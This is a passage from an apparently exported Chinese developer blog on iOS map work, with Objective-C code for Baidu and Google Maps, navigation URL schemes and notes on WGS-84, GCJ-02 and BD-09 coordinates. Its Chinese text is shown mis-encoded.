‡ç‚¹å¹¶è®¡ç®—å‡ºè·ç¦»d æ ¹æ®å½“å‰ç²¾åº¦åœˆåŠå¾„ * 2 å’Œ d æ¯”è¾ƒï¼Œå¦‚æžœè¶…å‡ºå±å¹•å°±é‡æ–°è®¾ç½®åœ°å›¾æ˜¾ç¤ºåŒºåŸŸ è®¡ç®—å±å¹•è·ç¦»æ ¸å¿ƒä»£ç  12345CLLocationCoordinate2D leftCoor = [self.baiduMapView convertPoint:CGPointMake(0, XSScreenH) toCoordinateFromView:self.view];CLLocationCoordinate2D rightCoor = [self.baiduMapView convertPoint:CGPointMake(XSScreenW, XSScreenH) toCoordinateFromView:self.view];BMKMapPoint pointLeft = BMKMapPointForCoordinate(leftCoor);BMKMapPoint pointRight = BMKMapPointForCoordinate(rightCoor);return BMKMetersBetweenMapPoints(pointLeft, pointRight); 3.4ã€é…ç½®ä¿¡æ¯çš„å›žè°ƒï¼ˆçœŸæ­£å¼€å§‹å¤„ç†æ˜¾ç¤ºä½ç½®å¤§å¤´é’ˆã€ç²¾åº¦åœˆã€ç‚¹å‡»æ˜¾ç¤ºçš„å¼¹æ¡†æ³¡æ³¡ï¼‰ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// å¤§å¤´é’ˆåŠå¤§å¤´é’ˆå¼¹æ¡†- (BMKAnnotationView *)mapView:(BMKMapView *)mapView viewForAnnotation:(id &lt;BMKAnnotation&gt;)annotation&#123; XSLogFunc if (![annotation isKindOfClass:[XSPointAnnotation class]]) &#123; // ä¸æ˜¯è‡ªå®šä¹‰å¤§å¤´é’ˆæ¨¡åž‹ return nil; &#125; BMKAnnotationView *annotationView = nil; XSPointAnnotation *customAnnotation = (XSPointAnnotation *)annotation; if (customAnnotation.annotationType == XSAnnotationTypeLocationPoint) &#123; // å½“å‰ä½ç½®ç‚¹ç±»åž‹ annotationView = [mapView dequeueReusableAnnotationViewWithIdentifier:@&quot;LocationAnnotation&quot;]; if (annotationView == nil) &#123; annotationView = [[BMKPinAnnotationView alloc] initWithAnnotation:customAnnotation reuseIdentifier:@&quot;LocationAnnotation&quot;]; &#125; annotationView.image = [UIImage imageNamed:self.locationDetails.deviceBindingTypeImageName]; annotationView.draggable = NO; annotationView.canShowCallout = YES; // è‡ªå®šä¹‰çš„ç‚¹å‡»å¤§å¤´é’ˆæ˜¾ç¤ºçš„æ°”æ³¡View æ ¹æ®å…¬å¸éœ€æ±‚è‡ªå®šä¹‰ self.petAnnotationView.locationDetails = customAnnotation.locationDetailsModel; // éœ€è¦æ˜¾ç¤ºçš„è®¾å¤‡ä¿¡æ¯æ¨¡åž‹ self.petAnnotationView.isHiddenNoNeeds = NO; self.petAnnotationView.width = 270; annotationView.paopaoView = [[BMKActionPaopaoView alloc] initWithCustomView:self.petAnnotationView]; &#125; return annotationView;&#125;// ç²¾åº¦åœˆ- (BMKOverlayView *)mapView:(BMKMapView *)mapView viewForOverlay:(id &lt;BMKOverlay&gt;)overlay&#123; if ([overlay isKindOfClass:[BMKCircle class]])&#123; BMKCircleView *circleView = [[BMKCircleView alloc] initWithOverlay:overlay]; if (self.locationDetails.GpsType == XSLocationModeWifiAndLbs) &#123; circleView.fillColor = [[UIColor colorWithHexString:kAccuracyCircleWifiAndLbsFillColor] colorWithAlphaComponent:0.15]; circleView.strokeColor = [[UIColor colorWithHexString:kAccuracyCircleWifiAndLbsStrokeColor] colorWithAlphaComponent:0.05]; &#125; else if (self.locationDetails.GpsType == XSLocationModeLbs) &#123; circleView.fillColor = [[UIColor colorWithHexString:kAccuracyCircleLbsFillColor] colorWithAlphaComponent:0.15]; circleView.strokeColor = [[UIColor colorWithHexString:kAccuracyCircleLbsStrokeColor] colorWithAlphaComponent:0.05]; &#125; circleView.lineWidth = 1; return circleView; &#125; return nil;&#125;// ç™¾åº¦ååœ°ç†ç¼–ç è§£æžåœ°å€å›žè°ƒï¼Œéœ€è¦é‡æ–°åˆ·æ–°å¤§å¤´é’ˆçš„æ°”æ³¡æ¨¡åž‹æ•°æ®- (void)onGetReverseGeoCodeResult:(BMKGeoCodeSearch *)searcher result:(BMKReverseGeoCodeResult *)result errorCode:(BMKSearchErrorCode)error&#123; XSLog(@&quot;address:%@----%@&quot;, result.addressDetail, result.address); self.locationDetails.deviceAddress = result.address; self.petAnnotationView.locationDetails = self.locationDetails;&#125; 4ã€å¤šä¸ªåæ ‡çº¿æ˜¾ç¤ºåœ¨å±å¹•èŒƒå›´å†… ç»˜åˆ¶å¤šä¸ªè½¨è¿¹ç‚¹å’Œç»˜åˆ¶çº¿æ¯”è¾ƒç®€å•ï¼Œç›´æŽ¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ åœ¨åŽ†å²è½¨è¿¹ç•Œé¢ï¼Œå¯èƒ½å¸Œæœ›æ˜¾ç¤ºçš„æ‰€æœ‰è½¨è¿¹ç‚¹éƒ½åœ¨å±å¹•èŒƒå›´å†… 123456789101112131415161718192021222324252627282930313233343536373839404142- (void)baiduMapViewFitAnnotationsWithCoordinates:(CLLocationCoordinate2D *)coords count:(NSUInteger)count&#123; NSMutableArray *latArr = [[NSMutableArray alloc] init]; NSMutableArray *lonArr = [[NSMutableArray alloc] init]; for (XSLocationDetails *locationDetails in coordsModels) &#123; [latArr addObject:@(locationDetails.coordinateBD09ll.latitude)]; [lonArr addObject:@(locationDetails.coordinateBD09ll.longitude)]; &#125; NSNumber *latMax = [latArr valueForKeyPath:@&quot;@max.floatValue&quot;];//æœ€å¤§çº¬åº¦ NSNumber *latMin = [latArr valueForKeyPath:@&quot;@min.floatValue&quot;];//æœ€å°çº¬åº¦ NSNumber *lonMax = [lonArr valueForKeyPath:@&quot;@max.floatValue&quot;];//æœ€å¤§ç»åº¦ NSNumber *lonMin = [lonArr valueForKeyPath:@&quot;@min.floatValue&quot;];//æœ€å°ç»åº¦ BMKCoordinateRegion region; region.center.latitude = ([latMax doubleValue] + [latMin doubleValue]) / 2; region.center.longitude = ([lonMax doubleValue] + [lonMin doubleValue]) / 2; region.span.latitudeDelta = 0.0055; // æ•°å­—è¶Šå° ç¼©æ”¾ç­‰çº§è¶Šå¤§ region.span.longitudeDelta = 0.0055; region = [self.baiduMapView regionThatFits:region]; [self.baiduMapView setRegion:region animated:YES]; // if (count &lt; 2) return;// CLLocationCoordinate2D coor = [coordsModels.firstObject coordinateBD09ll];// BMKMapPoint pt = BMKMapPointForCoordinate(coor);// CGFloat ltX, ltY, rbX, rbY;// ltX = pt.x, ltY = pt.y;// rbX = pt.x, rbY = pt.y;//// for (int i = 1; i &lt; count; i++) &#123;// CLLocationCoordinate2D coor = [coordsModels[i] coordinateBD09ll];// BMKMapPoint pt = BMKMapPointForCoordinate(coor);// if (pt.x &lt; ltX) ltX = pt.x;// if (pt.x &gt; rbX) rbX = pt.x;// if (pt.y &gt; ltY) ltY = pt.y;// if (pt.y &lt; rbY) rbY = pt.y;// &#125;// BMKMapRect rect;// rect.origin = BMKMapPointMake(ltX , ltY);// rect.size = BMKMapSizeMake(rbX - ltX, rbY - ltY);// [self.baiduMapView setVisibleMapRect:rect];// self.baiduMapView.zoomLevel = self.baiduMapView.zoomLevel - 0.3;&#125; è°·æ­Œåœ°å›¾1ã€æ³¨å†Œåœ°å›¾api key12// åœ¨ç¨‹åºå¯åŠ¨ä»£ç†æ–¹æ³•æ³¨å†Œgoogle map api key è°·æ­Œå¼€å‘è€…å¹³å°èŽ·å–[GMSServices provideAPIKey:kGoogleMapApiKey]; 2ã€åˆå§‹åŒ–åœ°å›¾123456789101112- (void)setupGoogleMapView&#123; GMSCameraPosition *camera = [GMSCameraPosition cameraWithLatitude:0 longitude:0 zoom:kMapsZoomLevel]; GMSMapView *mapView = [GMSMapView mapWithFrame:CGRectMake(0, 0, XSScreenW, XSScreenH) camera:camera]; mapView.delegate = self; mapView.myLocationEnabled = YES; [mapView setMinZoom:kMapsMinZoomLevel maxZoom:kMapsMaxZoomLevel]; mapView.settings.compassButton = YES; mapView.settings.consumesGesturesInView = NO; [self.view insertSubview:mapView atIndex:0]; self.googleMapView = mapView;&#125; 3ã€æ˜¾ç¤ºè‡ªå®šä¹‰å¤§å¤´é’ˆ 3.1ã€ä»ŽæœåŠ¡å™¨èŽ·å–å½“å‰è®¾å¤‡çš„ç›¸å…³ä¿¡æ¯è½¬ä¸ºæ¨¡åž‹æ•°æ®(XSDeviceLocation *locationDetails) 3.2ã€æ ¹æ®å½“å‰æ˜¾ç¤ºçš„åœ°å›¾ç±»åž‹è®¾ç½®å¯¹åº”çš„åæ ‡ä¿¡æ¯å¤§å¤´é’ˆ æˆ‘çš„åšæ³•åœ¨XSDeviceLocationæ¨¡åž‹é‡Œé¢æä¾›äº†å¯¹åº”åœ°å›¾çš„èŽ·å–å±žæ€§ï¼Œåœ¨å±žæ€§getteræ–¹æ³•ä¸­è¿›è¡ŒæœåŠ¡å™¨çš„åæ ‡è½¬æ¢(å¤„ç†å›½å†…è¿”å›žç«æ˜Ÿåæ ‡ã€å›½å¤–è¿”å›žæ ‡å‡†åæ ‡) å¦‚èŽ·å–ç™¾åº¦åæ ‡locationCoordinateBaiduã€èŽ·å–è°·æ­Œåæ ‡locationCoordinateGoogle æ ¹æ®ç±»åž‹è®¾ç½®åæ ‡æ•°æ® 123456- (void)setupPetLocationCoordinate:(CLLocationCoordinate2D)coordinate mapType:(XSDisplayMapType)mapType&#123; // åæ ‡è¿‡æ»¤ç­‰å…¶ä»–æ“ä½œ // ... [self setupGoogleMapCoordinate:coordinate];&#125; 3.3ã€æ ¹æ®è®¾å¤‡åæ ‡çš„ç›¸å…³é…ç½® 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364- (void)setupGoogleMapCoordinate:(CLLocationCoordinate2D)coordinate&#123; [self.googleMapView animateToLocation:coordinate]; // Creates a marker in the center of the map. self.marker.markerType = XSMarkerTypeDefaultLocation; self.marker.position = coordinate; self.marker.appearAnimation = YES; self.marker.tracksInfoWindowChanges = YES; self.marker.icon = [UIImage imageNamed:self.locationDetails.deviceBindingTypeImageName]; self.marker.map = self.googleMapView; self.marker.locationDetailsModel = self.locationDetails; // ä¼ é€’æ¨¡åž‹æ•°æ® // ç‚¹å‡»å¤§å¤´é’ˆæ˜¾ç¤ºçš„è‡ªå®šä¹‰æ°”æ³¡æŽ§ä»¶ æ‡’åŠ è½½ self.petAnnotationView.locationDetails = self.locationDetails; self.petAnnotationView.isHiddenNoNeeds = NO; [[GMSGeocoder geocoder] reverseGeocodeCoordinate:coordinate completionHandler:^(GMSReverseGeocodeResponse * _Nullable response, NSError * _Nullable error) &#123; //FIXME: é”™è¯¯ä¿¡æ¯å¤„ç† // èŽ·å–ç¬¬ä¸€ä¸ªä½ç½®ä¿¡æ¯ GMSAddress *addressModel = response.firstResult; NSString *firstString = addressModel.lines.firstObject; NSString *lastString = addressModel.lines.lastObject; NSString *address = [NSString stringWithFormat:@&quot;%@, %@&quot;, firstString, lastString]; self.locationDetails.deviceAddress = address; self.marker.locationDetailsModel = self.locationDetails; // ä¼ é€’æ¨¡åž‹æ•°æ® self.petAnnotationView.locationDetails = self.locationDetails; &#125;]; // æ·»åŠ ç²¾åº¦åœˆ self.googleAccuracycircle.map = nil; // æ¸…ç©ºå·²å­˜åœ¨çš„ if (self.locationDetails.GpsType == XSLocationModeWifiAndLbs) &#123; // wifi æ˜¾ç¤ºç²¾åº¦åœˆ self.googleAccuracycircle = [GMSCircle circleWithPosition:coordinate radius:self.locationDetails.Radius]; self.googleAccuracycircle.fillColor = [[UIColor colorWithHexString:kAccuracyCircleWifiAndLbsFillColor] colorWithAlphaComponent:0.15]; self.googleAccuracycircle.strokeColor = [[UIColor colorWithHexString:kAccuracyCircleWifiAndLbsStrokeColor] colorWithAlphaComponent:0.15]; self.googleAccuracycircle.strokeWidth = 1; self.googleAccuracycircle.map = self.googleMapView; &#125; else if (self.locationDetails.GpsType == XSLocationModeLbs) &#123; self.googleAccuracycircle = [GMSCircle circleWithPosition:coordinate radius:self.locationDetails.Radius]; self.googleAccuracycircle.fillColor = [[UIColor colorWithHexString:kAccuracyCircleLbsFillColor] colorWithAlphaComponent:0.15]; self.googleAccuracycircle.strokeColor = [[UIColor colorWithHexString:kAccuracyCircleLbsStrokeColor] colorWithAlphaComponent:0.15]; self.googleAccuracycircle.strokeWidth = 1; self.googleAccuracycircle.map = self.googleMapView; &#125; // è®¡ç®—åœ°å›¾åŒºåŸŸç¼©æ”¾ CLLocationDistance horizontalScreenDistance = [self horizontalScreenDistance]; if (self.locationDetails.Radius * 2 &lt; horizontalScreenDistance || self.googleMapView.camera.zoom &lt;= kMapsMinZoomLevel) &#123; return; &#125; int zoomLevel = self.googleMapView.camera.zoom;// double radius = self.locationDetails.Radius + self.locationDetails.Radius / 2; double radius = self.locationDetails.Radius / 2; double scale = radius / 500; zoomLevel = (int) (16 - log(scale) / log(2)); zoomLevel--; [CATransaction begin]; [CATransaction setValue:[NSNumber numberWithFloat:XSAnimationDuration] forKey:kCATransactionAnimationDuration]; GMSCameraPosition *camera = [GMSCameraPosition cameraWithLatitude:coordinate.latitude longitude:coordinate.longitude zoom:zoomLevel]; [self.googleMapView animateToCameraPosition:camera]; [CATransaction commit];&#125; è‡ªå®šä¹‰å¤§å¤´é’ˆæ¨¡åž‹XSMarkerç»§æ‰¿è‡ªGMSMarker æ‰©å……ä¸¤ä¸ªå±žæ€§ï¼š markerType ï¼šæžšä¸¾ï¼Œæ˜¾ç¤ºçš„å¤§å¤´é’ˆç±»åž‹ï¼ˆåˆ‡æ¢å›¾æ ‡ï¼‰ locationDetailsModel ï¼šå½“å‰å¤§å¤´é’ˆçš„æ¨¡åž‹æ•°æ®ï¼Œç‚¹å‡»æ˜¾ç¤ºæ°”æ³¡è¯¦æƒ…çš„æ•°æ® æ·»åŠ ç²¾åº¦åœˆåŽç²¾åº¦åŠå¾„è¿‡å¤§å¯èƒ½è¶…å‡ºå±å¹•å½±å“ç”¨æˆ·ä½“éªŒï¼Œè§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š æ ¹æ®å±å¹•æœ€å·¦å’Œæœ€åŽä¸¤ä¸ªç‚¹ï¼Œè½¬æ¢å‡ºåœ°å›¾ä¸Šå¯¹åº”çš„åæ ‡ç‚¹å¹¶è®¡ç®—å‡ºè·ç¦»d æ ¹æ®å½“å‰ç²¾åº¦åœˆåŠå¾„ * 2 å’Œ d æ¯”è¾ƒï¼Œå¦‚æžœè¶…å‡ºå±å¹•å°±é‡æ–°è®¾ç½®åœ°å›¾æ˜¾ç¤ºåŒºåŸŸ è®¡ç®—å±å¹•è·ç¦»æ ¸å¿ƒä»£ç  123CLLocationCoordinate2D leftCoor = [self.googleMapView.projection coordinateForPoint:CGPointMake(0, XSScreenH)];CLLocationCoordinate2D rightCoor = [self.googleMapView.projection coordinateForPoint:CGPointMake(XSScreenW, XSScreenH)];return GMSGeometryDistance(leftCoor, rightCoor); 3.4ã€ç‚¹å‡»å¤§å¤´é’ˆæ˜¾ç¤ºæ°”æ³¡viewçš„å›žè°ƒ 1234567- (UIView *)mapView:(GMSMapView *)mapView markerInfoWindow:(GMSMarker *)marker&#123; XSLogFunc self.petAnnotationView.width = 270; self.petAnnotationView.locationDetails = self.locationDetails; // åˆ·æ–°æ˜¾ç¤ºçš„ä¿¡æ¯ return self.petAnnotationView;&#125; 4ã€å¤šä¸ªåæ ‡çº¿æ˜¾ç¤ºåœ¨å±å¹•èŒƒå›´å†… ç»˜åˆ¶å¤šä¸ªè½¨è¿¹ç‚¹å’Œç»˜åˆ¶çº¿æ¯”è¾ƒç®€å•ï¼Œç›´æŽ¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ åœ¨åŽ†å²è½¨è¿¹ç•Œé¢ï¼Œå¯èƒ½å¸Œæœ›æ˜¾ç¤ºçš„æ‰€æœ‰è½¨è¿¹ç‚¹éƒ½åœ¨å±å¹•èŒƒå›´å†… 123456789- (void)googleMapViewFitAnnotationsWithCoordinates:(NSArray *)coordsModels count:(NSUInteger)count&#123; GMSCoordinateBounds *bounds = [[GMSCoordinateBounds alloc] init]; for (int i = 1; i &lt; count; i++) &#123; CLLocationCoordinate2D coor = [coordsModels[i] locationCoordinate2D]; bounds = [bounds includingCoordinate:coor]; &#125; [self.googleMapView animateWithCameraUpdate:[GMSCameraUpdate fitBounds:bounds withPadding:30.0f]];&#125; Maps å¯¼èˆª æ£€æµ‹æ˜¯å¦å®‰è£…å¯¹åº”çš„åœ°å›¾ å¸¸ç”¨çš„4ä¸ªåœ°å›¾çš„ URL Scheme: 1.è‹¹æžœè‡ªå¸¦åœ°å›¾ï¼ˆä¸éœ€è¦æ£€æµ‹ï¼Œæ‰€ä»¥ä¸éœ€è¦URL Schemeï¼‰2.ç™¾åº¦åœ°å›¾ ï¼šbaidumap://3.é«˜å¾·åœ°å›¾ ï¼šiosamap://4.è°·æ­Œåœ°å›¾ ï¼šcomgooglemaps:// åœ¨IOS9ä¹‹åŽï¼Œè‹¹æžœè¿›ä¸€æ­¥å®Œå–„äº†å®‰å…¨æœºåˆ¶ï¼Œå¿…é¡»åœ¨plisté‡Œé¢è®¾ç½®url schemeç™½åå•ï¼Œä¸ç„¶æ— æ³•æ‰“å¼€å¯¹åº”çš„åº”ç”¨ æ·»åŠ ç™½åå•ï¼š åœ¨ info.plist æ–‡ä»¶é‡Œé¢ï¼Œæ·»åŠ ä¸€ä¸ªå­—æ®µï¼šLSApplicationQueriesSchemesï¼Œç±»åž‹ä¸ºæ•°ç»„ ç„¶åŽåœ¨è¿™ä¸ªæ•°ç»„é‡Œé¢å†æ·»åŠ æˆ‘ä»¬æ‰€éœ€è¦çš„åœ°å›¾ URL Scheme : 1234&gt; baidumap // ç™¾åº¦&gt; iosamap // é«˜å¾·&gt; comgooglemaps // è°·æ­Œ&gt; åº”ç”¨å†…éƒ¨è°ƒç”¨google mapsåœ°å›¾å‘èµ·å¯¼èˆªåŠŸèƒ½ 1ã€x-source=%@&amp;x-success=%@è·Ÿé«˜å¾·ä¸€æ · è¿™é‡Œåˆ†åˆ«ä»£è¡¨APPçš„åç§°å’ŒURL Scheme 2ã€saddr=è¿™é‡Œç•™ç©ºåˆ™è¡¨ç¤ºä»Žå½“å‰ä½ç½®è§¦å‘ã€‚ 1234567if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@&quot;comgooglemaps://&quot;]]) &#123; NSMutableDictionary *googleMapDic = [NSMutableDictionary dictionary]; googleMapDic[@&quot;title&quot;] = @&quot;è°·æ­Œåœ°å›¾&quot;; NSString *urlString = [[NSString stringWithFormat:@&quot;comgooglemaps://?x-source=%@&amp;x-success=%@&amp;saddr=&amp;daddr=%f,%f&amp;directionsmode=driving&quot;,@&quot;å¯¼èˆªæµ‹è¯•&quot;,@&quot;nav123456&quot;,endLocation.latitude, endLocation.longitude] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; googleMapDic[@&quot;url&quot;] = urlString; [maps addObject:googleMapDic];&#125; åº”ç”¨å†…éƒ¨è°ƒç”¨ç™¾åº¦åœ°å›¾å‘èµ·å¯¼èˆªåŠŸèƒ½ 1ï¼Œorigin=, è¿™ä¸ªæ˜¯ä¸èƒ½è¢«ä¿®æ”¹çš„ï¼Œä¸ç„¶æ— æ³•æŠŠå‡ºå‘ä½ç½®è®¾ç½®ä¸ºå½“å‰ä½ç½® 2ï¼Œdestination = latlng:%f,%f|name = ç›®çš„åœ°è¿™é‡Œé¢çš„ name çš„å­—æ®µä¸èƒ½çœç•¥ï¼Œå¦åˆ™å¯¼èˆªä¼šå¤±è´¥ï¼Œè€ŒåŽé¢çš„æ–‡å­—åˆ™å¯ä»¥éšæ„ï¼Œèµ‹ä¸ªä½ çš„ç›®çš„åœ°çš„å€¼ç»™ä»–å°±å¯ä»¥äº†ã€‚ 3ï¼Œcoord_type = gcj02coord_type å…è®¸çš„å€¼ä¸º bd09llã€gcj02ã€wgs84ï¼Œå¦‚æžœä½  APP çš„åœ°å›¾ SDK ç”¨çš„æ˜¯ç™¾åº¦åœ°å›¾ SDKï¼Œè¯·å¡« bd09llï¼Œå¦åˆ™å°±å¡«gcj02ï¼Œwgs84çš„è¯åŸºæœ¬æ˜¯ç”¨ä¸ä¸Šäº† 1234567if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@&quot;baidumap://&quot;]]) &#123; NSMutableDictionary *baiduMapDic = [NSMutableDictionary dictionary]; baiduMapDic[@&quot;title&quot;] = @&quot;ç™¾åº¦åœ°å›¾&quot;; NSString *urlString = [[NSString stringWithFormat:@&quot;baidumap://map/direction?origin=&#123;&#123;æˆ‘çš„ä½ç½®&#125;&#125;&amp;destination=latlng:%f,%f|name=åŒ—äº¬&amp;mode=driving&amp;coord_type=gcj02&quot;,endLocation.latitude,endLocation.longitude] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; baiduMapDic[@&quot;url&quot;] = urlString; [maps addObject:baiduMapDic];&#125; åº”ç”¨å†…éƒ¨è°ƒç”¨é«˜å¾·åœ°å›¾å‘èµ·å¯¼èˆªåŠŸèƒ½ 1ã€sourceApplication=%@&amp;backScheme=%@sourceApplicationä»£è¡¨ä½ è‡ªå·±APPçš„åç§° ä¼šåœ¨ä¹‹åŽè·³å›žçš„æ—¶å€™æ˜¾ç¤ºå‡ºæ¥ æ‰€ä»¥å¿…é¡»å¡«å†™ backSchemeæ˜¯ä½ APPçš„URL Scheme ä¸å¡«æ˜¯è·³ä¸å›žæ¥çš„å“Ÿ 2ã€dev=0è¿™é‡Œå¡«0å°±è¡Œäº†ï¼Œè·Ÿä¸Šé¢çš„gcj02ä¸€ä¸ªæ„æ€ 1ä»£è¡¨wgs84 ä¹Ÿç”¨ä¸ä¸Š 1234567if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@&quot;iosamap://&quot;]]) &#123; NSMutableDictionary *gaodeMapDic = [NSMutableDictionary dictionary]; gaodeMapDic[@&quot;title&quot;] = @&quot;é«˜å¾·åœ°å›¾&quot;; NSString *urlString = [[NSString stringWithFormat:@&quot;iosamap://navi?sourceApplication=%@&amp;backScheme=%@&amp;lat=%f&amp;lon=%f&amp;dev=0&amp;style=2&quot;,@&quot;å¯¼èˆªåŠŸèƒ½&quot;,@&quot;nav123456&quot;,endLocation.latitude,endLocation.longitude] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; gaodeMapDic[@&quot;url&quot;] = urlString; [maps addObject:gaodeMapDic];&#125; åº”ç”¨å†…éƒ¨è°ƒç”¨è‹¹æžœåœ°å›¾å‘èµ·å¯¼èˆªåŠŸèƒ½ 123456CLLocationCoordinate2D loc = CLLocationCoordinate2DMake([self.model.latitude floatValue], [self.model.longitude floatValue]);MKMapItem *currentLocation = [MKMapItem mapItemForCurrentLocation];MKMapItem *toLocation = [[MKMapItem alloc] initWithPlacemark:[[MKPlacemark alloc] initWithCoordinate:loc addressDictionary:nil]];[MKMapItem openMapsWithItems:@[currentLocation, toLocation]launchOptions:@&#123;MKLaunchOptionsDirectionsModeKey: MKLaunchOptionsDirectionsModeDriving,MKLaunchOptionsShowsTrafficKey: [NSNumber numberWithBool:YES]&#125;];]]></content>
      <categories>
        <category>iOS</category>
        <category>åœ°å›¾</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>åœ°å›¾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¹‹åœ°å›¾ç¯‡(ä¸€)]]></title>
    <url>%2Farchives%2F1c8732fb.html</url>
    <content type="text"><![CDATA[èµµå®¢ç¼¦èƒ¡ç¼¨ï¼Œå´é’©éœœé›ªæ˜Žã€‚é“¶éžç…§ç™½é©¬ï¼Œé£’æ²“å¦‚æµæ˜Ÿã€‚åæ­¥æ€ä¸€äººï¼Œåƒé‡Œä¸ç•™è¡Œã€‚äº‹äº†æ‹‚è¡£åŽ»ï¼Œæ·±è—èº«ä¸Žåã€‚ åœ°å›¾åæ ‡ä½“ç³»1.WGSï¼84åŽŸå§‹åæ ‡ç³» ä¸€èˆ¬ç”¨å›½é™…GPSçºªå½•ä»ªè®°å½•ä¸‹æ¥çš„ç»çº¬åº¦ é€šè¿‡GPSå®šä½æ‹¿åˆ°çš„åŽŸå§‹ç»çº¬åº¦ Googleï¼ˆå›½å¤–ï¼‰ã€é«˜å¾·åœ°å›¾ï¼ˆå›½å¤–ï¼‰ã€OSMåœ°å›¾å®šä½çš„çš„ç»çº¬åº¦ã€‚ ä½†æ˜¯åœ¨å›½å†…æ˜¯ä¸å…è®¸ç›´æŽ¥ç”¨WGS84åæ ‡ç³»æ ‡æ³¨çš„ï¼Œå¿…é¡»ç»è¿‡åŠ å¯†åŽæ‰èƒ½ä½¿ç”¨ æ³¨æ„ï¼šå›½å†…ä¸å…è®¸ç›´æŽ¥ä½¿ç”¨ï¼Œä½†æ˜¯GPSè®¾å¤‡ä¸Šä¼ çš„æ•°æ®è¿˜æ˜¯æ ‡å‡†çš„æ•°æ®ï¼Œå›½å†…ä½¿ç”¨éœ€è¦è½¬ä¸ºGCJï¼02åæ ‡ 2.GCJï¼02åæ ‡ç³» GCJï¼02åæ ‡ç³»åˆåâ€œç«æ˜Ÿåæ ‡ç³»â€ï¼Œæ˜¯æˆ‘å›½å›½æµ‹å±€ç‹¬åˆ›çš„åæ ‡ä½“ç³»ï¼Œç”±WGSï¼84åŠ å¯†è€Œæˆã€‚ åœ¨å›½å†…ï¼Œå¿…é¡»è‡³å°‘ä½¿ç”¨GCJï¼02åæ ‡ç³»ï¼Œå¦‚é«˜å¾·å’ŒGoogleåœ¨å›½å†…ã€‚ æˆ–è€…ä½¿ç”¨åœ¨GCJï¼02åŠ å¯†åŽå†è¿›è¡ŒåŠ å¯†çš„åæ ‡ç³»ï¼Œå¦‚ç™¾åº¦åæ ‡ç³»ã€‚ 3.ç™¾åº¦åæ ‡ç³»:bd-09 ç™¾åº¦åæ ‡ç³»æ˜¯åœ¨GCJï¼02åæ ‡ç³»çš„åŸºç¡€ä¸Šå†æ¬¡åŠ å¯†åç§»åŽå½¢æˆçš„åæ ‡ç³»ï¼Œåªé€‚ç”¨äºŽç™¾åº¦åœ°å›¾ã€‚ å›½å†…åœ°å›¾åç§»é—®é¢˜ åœ°å›¾åç§»é—®é¢˜ä¸€èˆ¬åªæœ‰åœ¨å›½å†…æ‰ä¼šå‡ºçŽ° å›½å†…â€˜æ ‡å‡†â€™GPSè®¾å¤‡å®šä½åæ ‡ä¸ºGCJï¼02åæ ‡ç³»ï¼Œæ˜¾ç¤ºåœ°å›¾ä¸ºåç§»è¿‡çš„åœ°å›¾ï¼Œæœ€ç»ˆæ˜¾ç¤ºçš„ä¸ºå‡†ç¡®çš„ä½ç½®å›½å†…éžâ€™æ ‡å‡†â€™çš„è®¾å¤‡å®šä½åæ ‡ä¸ºWGSï¼84åŽŸå§‹åæ ‡ç³»ï¼Œæ˜¾ç¤ºåœ°å›¾ä¸ºåç§»è¿‡çš„åœ°å›¾ï¼Œæœ€ç»ˆæ˜¾ç¤ºçš„ä½ç½®å‡ºçŽ°åç§» Google MapsGoogle Mapsæ³¨æ„ç‚¹ è‡ªå®šä¹‰å¼¹çª—å¯ä»¥ç›´æŽ¥ä½¿ç”¨InfoWindow è°ƒæ•´åœ°å›¾ä¸Šé¢çš„å›¾æ ‡ä½ç½® æ²¡åŠžæ³•å¯ä»¥ç›´æŽ¥è°ƒæ•´æ¯ä¸€ä¸ªå›¾æ ‡çš„ä½ç½® å¯ä»¥è®¾ç½®åœ°å›¾çš„å†…å®¹paddingå±žæ€§æ¥è°ƒæ•´ ä½†æ˜¯paddingå±žæ€§è®¾ç½®å±€é™äºŽè°ƒæ•´å’Œå±å¹•è¾¹ç¼˜çš„è·ç¦» åˆ·æ–°åœ°å›¾å¼¹æ¡†å†…å®¹å¯ä»¥è®¾ç½®è‡ªåŠ¨åˆ·æ–°å¸§çš„é—´éš”ï¼ˆå¯¹åº”æœ‰çš„ä¸éœ€è¦å˜åŒ–çš„æŽ§ä»¶å¯ä»¥å…³é—­ä»¥èŠ‚çº¦æ€§èƒ½ï¼‰ æ·»åŠ æ‰‹åŠ¿ä¼šå’Œåœ°å›¾çš„æ‰‹åŠ¿å†²çªï¼Œéœ€è¦è®¾ç½®åœ°å›¾çš„consumesGesturesInViewä¸ºfalse consumesGesturesInViewæ‰‹åŠ¿æŽ§åˆ¶æ˜¯å¦ç”¨æˆ·è®¾ç½®çš„æ‰‹åŠ¿è¢«è°·æ­Œåœ°å›¾æŽ¥ç®¡å¤„ç†é»˜è®¤è®¾ç½®ä¸ºYES å®šä½ç‚¹çš„è‡ªå®šä¹‰å¼¹æ¡† æ¯ä¸€ä¸ªå®šä½ç‚¹å¯¹è±¡GMSMarker å¦‚æžœæƒ³è¦è‡ªå®šä¹‰å¼¹æ¡†å¯ä»¥åœ¨ä¸‹é¢æ–¹æ³•å®žçŽ° (UIView *)mapView:(GMSMapView *)mapView markerInfoWindow:(GMSMarker *)marker å¦‚æžœæƒ³è¦åˆ·æ–°åœ°å›¾å¼¹æ¡†çš„å†…å®¹, éœ€è¦åœ¨è®¾ç½®Markerçš„æ–¹æ³•é‡Œç›´æŽ¥è½¬æ¢åæ ‡ï¼Œå¹¶ä¸”å®žæ—¶ä½ç½®çš„è‡ªå®šä¹‰å¼¹æ¡†éœ€è¦å…¨å±€æ˜¯ä¸€ä¸ªæŽ§ä»¶ï¼Œå¦åˆ™æ— æ³•åˆ·æ–°æŽ§ä»¶ 